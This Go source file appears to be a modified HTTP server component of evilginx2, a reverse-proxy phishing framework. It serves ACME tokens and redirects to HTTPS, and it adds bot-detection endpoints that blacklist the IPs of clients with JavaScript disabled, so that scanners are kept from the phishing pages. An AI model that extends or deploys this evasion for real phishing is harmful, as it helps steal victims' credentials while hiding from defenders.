package core

import (
	"net/http"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/log"
 )

type HttpServer struct {
	srv       *http.Server
	acmeTokens map[string]string
	bl        *Blacklist // Added Blacklist field
}

func NewHttpServer(bl *Blacklist ) (*HttpServer, error) {
	s := &HttpServer{bl: bl} // Initialize Blacklist field
	s.acmeTokens = make(map[string]string)

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         ":80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge ).Methods("GET")
	r.HandleFunc("/js_disabled_bot_detection", s.handleJSDisabledBot).Methods("GET")
	r.HandleFunc("/js_enabled_bot_detection", s.handleJSEnabledBot).Methods("GET")
	r.HandleFunc("/{path:.*}", s.HandleRedirect)

	return s, nil
}

func (s *HttpServer) Start() {
	go func() {
		err := s.srv.ListenAndServe()
		if err != nil {
			log.Error("http server: %v", err )
		}
	}()
}

func (s *HttpServer) AddACMEToken(token, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request ) {
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound )
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path )
	w.WriteHeader(http.StatusOK )
	w.Header().Set("Content-Type", "text/plain")
	_, err := w.Write([]byte(key))
	if err != nil {
		log.Error("acme token: %v")
	}
}

func (s *HttpServer) HandleRedirect(w http.ResponseWriter, r *http.Request ) {
	http.Redirect(w, r, "https://"+r.Host+r.URL.String( ), http.StatusFound )
}

func (s *HttpServer) handleJSDisabledBot(w http.ResponseWriter, r *http.Request ) {
	ip := r.RemoteAddr
	log.Warning("JavaScript disabled bot detected from IP: %s", ip)
	s.bl.Add(ip, "js_disabled") // Add IP to blacklist
	w.WriteHeader(http.StatusOK )
}

func (s *HttpServer) handleJSEnabledBot(w http.ResponseWriter, r *http.Request ) {
	log.Info("JavaScript enabled client connected from IP: %s", r.RemoteAddr)
	w.WriteHeader(http.StatusOK )
}
